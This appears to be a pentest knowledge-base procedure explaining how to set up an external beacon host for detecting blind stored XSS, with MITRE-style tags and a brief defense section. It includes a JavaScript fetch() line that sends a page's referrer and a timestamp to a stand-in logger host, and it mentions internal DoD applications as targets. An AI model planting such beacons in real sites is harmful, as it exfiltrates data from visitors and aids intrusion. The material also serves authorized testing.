---
id: proc-uuid-001
name: Set-Up-XSS-Beacon-Host
tags:
  - xss
  - beacon
  - detection
type: procedure
tools:
  - '[[tools/xp-ht-Beacon-Host]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:24.668Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Set-Up-XSS-Beacon-Host

## Summary

This procedure sets up an external beacon host to detect blind XSS triggers by hosting a simple script that logs incoming requests, including referer headers and timestamps, confirming payload execution without direct access to the target environment.

## Description

In scenarios like blind stored XSS testing, where feedback is not immediate, an external beacon allows remote detection of script execution. This is particularly useful in internal or air-gapped networks, as seen in DoD applications, where pings reveal execution context such as the triggering URL and internal host details. Prerequisites include access to an external hosting service and basic web server setup.

## Requirements

1. External domain or URL shortener service (e.g., xp.ht) for hosting
2. Ability to serve static files or simple endpoints
3. Monitoring tool for logging requests (e.g., server logs or webhook)

## Defense

Defensive measures and detection strategies:

- Implement Content Security Policy (CSP) to block external script sources
- Monitor outbound network traffic for unexpected connections to known beacon domains
- Sanitize all stored user inputs to prevent script injection

## Objectives

1. Establish a reliable detection mechanism for XSS execution
2. Capture execution metadata for analysis
3. Enable payload refinement based on observed triggers

## Instructions

### Step 1: Select and Configure Beacon Host

**Context**: Choose a reliable external service to host the beacon script, ensuring it can handle GET requests and log details.

No specific command; use the [[tools/xp-ht-Beacon-Host]] service to upload a simple HTML or JS file at `/beacon` that performs a self-ping or logs the request.

> Expected: A URL like `https://xp.ht/beacon` ready for embedding in payloads.

### Step 2: Implement Logging

**Context**: Set up logging to capture referer, user-agent, and query parameters from triggered requests.

Configure server-side logging or use a script like:

```javascript
// Simple beacon script
fetch('https://your-logger.com/log?referer=' + encodeURIComponent(document.referrer) + '&time=' + Date.now());
```

> Explanation: This script sends execution details back to a logger upon loading, revealing the internal trigger.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/xp-ht-Beacon-Host]]

## Tags

- [[xss]]
- [[beacon]]
- [[detection]]
